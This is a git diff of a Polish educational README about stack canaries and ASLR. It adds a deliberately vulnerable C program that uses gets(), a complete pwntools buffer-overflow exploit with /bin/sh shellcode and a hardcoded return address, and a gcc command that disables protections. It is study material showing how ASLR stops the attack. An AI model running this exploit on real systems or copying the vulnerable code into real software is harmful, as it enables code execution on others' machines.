@@ -24,7 +24,7 @@ Kanarek stosu jest specjalną wartością umieszczoną na stosie w odpowiednim m
   <img src="obrazy/kanarek_1.png" />
 </p>
 <p align = "center">
-  Rys.1 - Schematyczne przedstawienie możliwej struktury ramki stosu z uwzględnieniem kanarka stosu.
+  Rys. 1 - Schematyczne przedstawienie możliwej struktury ramki stosu z uwzględnieniem kanarka stosu.
 </p>  
   
 
@@ -32,7 +32,7 @@ Kanarek stosu jest specjalną wartością umieszczoną na stosie w odpowiednim m
   <img src="obrazy/kanarek_2.png" />
 </p>
 <p align = "center">
-  Rys.2 - Część wygenerowanego przez kompilator gcc kodu Assemblera dla włączonych, i dla wyłączonych kanarków stosu.
+  Rys. 2 - Część wygenerowanego przez kompilator gcc kodu Assemblera dla włączonych, i dla wyłączonych kanarków stosu.
 </p>
 
 #### Typy kanarków stosu
@@ -109,7 +109,7 @@ Poniżej okno debuggera dla uruchomienia exploitu komendą ```python3 exploit.py
   <img src="obrazy/exploit_bez_kanarkow.png" />
 </p>
 <p align = "center">
-  Rys.3 - Jak widać wykonanie shellcode'u powiodło się.
+  Rys. 3 - Jak widać wykonanie shellcode'u powiodło się.
 </p>  
 
 
@@ -119,7 +119,7 @@ Okno debuggera dla uruchomienia exploitu komendą ```python3 exploit.py``` z wł
   <img src="obrazy/exploit_z_kanarkami.png" />
 </p>
 <p align = "center">
-  Rys.4 - W tej sytuacji wykonanie programu zostało zatrzymane zgodnie z oczekiwaniami.
+  Rys. 4 - W tej sytuacji wykonanie programu zostało zatrzymane zgodnie z oczekiwaniami.
 </p>  
 
 ### Porównanie metody dla kompilatorów gcc oraz clang
@@ -127,3 +127,84 @@ Przedstawiana w tym punkcie metoda działa w podobny sposób w przypadku najnows
 
 ### Użyteczność metody oraz wady jej stosowania
 Kanarki stosu są jedną z podstawowych metod zabezpieczenia przed atakami typu _buffer overflow_. Mimo wprowadzanych ulepszeń jak np. w kwestii randomizacji wartości kanarka, mogą się one okazać możliwe do przewidzenia, więc nigdy nie stanowią pełnego zabezpieczenia. Wymuszają one dla procesora dodatkowe instrukcje, wydłużając czas wykonania programu.
+
+## ASLR
+
+### Zakres działania
+_ASLR_ czyli _Address Space Layout Randomization_ jest techniką zapobiegającą możliwej eksploitacji programu poprzez naruszenia jego pamięci. Mechanim taki, w przeciwieństwie do wcześniej omaiwanych kanarków stosu, nie jest dodawany w jakiś sposób przez kompilator, a za jego działanie odpowiada sam system operacyjny. Jego działanie opiera się na losowaniu zestawu kluczowych adresów (takich jak miejsca stosu, sterty, czy bilbliotek). To w jaki dokładnie sposób się to odbywa, zależy od implementacji mechanizmu w danym systemie operacyjnym. W najlepszym przypadku istotne adresy powinny być losowe przy każdym wywołaniu ramki stosu. Powinno się także zadbać o zmianę przesunięcia kluczowych dla wykonania programu struktur o inną, losową wartość, przy każdym uruchomieniu programu.
+
+### Przykładowa aplikacja
+Poniższa aplikacja, napisana w języku _C_, została zbudowana na bazie aplikacji z porzedniego punktu. W poprzednim punkcie udało się wywołać instrukcje _shellcode_’u mino włączonego _ASLR_, ponieważ program podawał za każdym razem nowy, wylosowany adres stosu _main_. W tym punkcie aplikacja nie podaje takiego adresu. Zakładam, że atakujący zdobył ten adres w inny sposób, a przez brak włączonego _ASLR_ adres taki może zostać umieszczony na stałe w exploicie (który jest pokazany w kolejnym punkcie).
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+void get_users_name()
+{
+    char name[64] = {0};
+    puts("Podaj imie:");
+    gets(name);
+    printf("Czesc %s!\n", name);
+}
+
+int main()
+{
+    get_users_name();
+    return 0;
+}
+```
+
+Plik _main.c_ zawierający powyższy kod został dołączony do repozytorium i znajduje się w katalogu _ASLR_.
+
+### Exploit
+
+Poniższy exploit działa na zasadzie podobnej do poprzedniego, jednak tym razem nie zczytuje od adresu ramki stosu main od programu przy każdym wykonaniu, tylko ma na stałe ustalony adres tej ramki.
+
+```Python
+from pwn import *
+
+p = process("./main")
+p.readuntil("Podaj imie:\n")
+
+padding = b'\x90'*72
+RIP = p64(0x7fffffffdefc) #ustalony na stale adres stosu main
+NOP = b'\x90'*128
+shellcode =b'\xeb\x1e\x5f\x48\x31\xc0\x88\x47\x07\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x48\x31\xc9\x0f\x05\x48\x31\xc0\x48\x31\xff\xb0\x3c\x0f\x05\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x70\xd8\xff\xff\xff\x7f'
+payload =  padding + RIP + NOP + shellcode
+
+gdb.attach(p)
+
+p.sendline(payload)
+print(p.readall())
+```
+
+Plik _exploit.py_ zawierający powyższy kod został dołączony do repozytorium i znajduje się w katalogu _ASLR_.
+
+#### Działanie exploitu dla wersji programu bez włączonego zabezpieczenia oraz z włączonym zabezpieczeniem
+
+Najpierw działanie exploitu dla systemu Linux, po wykonaniu w terminalu polecenia dezaktywującego mechanizm ASLR. Kompilacja samego programu odbyła się przy użyciu komendy: ```gcc main.c -std=c99 -fno-stack-protector -z execstack -no-pie -w -o main -Wl,-z,norelro```:
+
+<p align="center">
+  <img src="obrazy/exploit_bez_aslr.png" />
+</p>
+<p align = "center">
+  Rys. 5 - Działanie exploitu z wyłączonym ASLR - wykonanie shellcode’u powiodło się.
+</p>  
+
+Następnie sprawdziłem czy exploit zadziała dla programu skompilowanego w porzedniej sytuacji, jednak z włączonym ASLR.
+
+<p align="center">
+  <img src="obrazy/exploit_z_aslr.png" />
+</p>
+<p align = "center">
+  Rys. 6 - Działanie exploitu z włączonym ASLR - wykonanie shellcode’u nie powiodło się.
+</p>  
+
+### Porównanie działania ASLR dla systemów z rodziny Windows oraz Linux
+
+Platformy _Windows_, oraz _Linux_ zapewniają _ASLR_ w odmienny sposób. Główna róznica jest taka, że _ASLR_ dla systemu _Windows 10_ jest dokonywany podczas ładowania programu i nie wpływa to na wydajność programu podczas jego działania. W systemach z rodziny _Linux_ operacje związane z _ASLR_ są dokonywane w trakcie działania programu, co ma wpływ na wydajność programu. W zamian za to w systemie _Linux_ wykorzystanie pamięci przez program może być lepiej zorganizowane.
+
+### Użyteczność metody oraz wady jej stosowania
+
+Opisana powyżej metoda może znacznie utrudnić atakującemu ataki typu _ROP_ (_return-oriented programming_). Mimo tego że technika jest często możliwa do obejścia, to warto ją strosować, w szczególności w połączeniu z innymi technikami (jak np. opisany w kolejnym punkcie niewykonywalny stos). Niestety, w zależności od implementacji, ma ona wpływ na wydajność, bądź wykorzystanie pamięci programu.
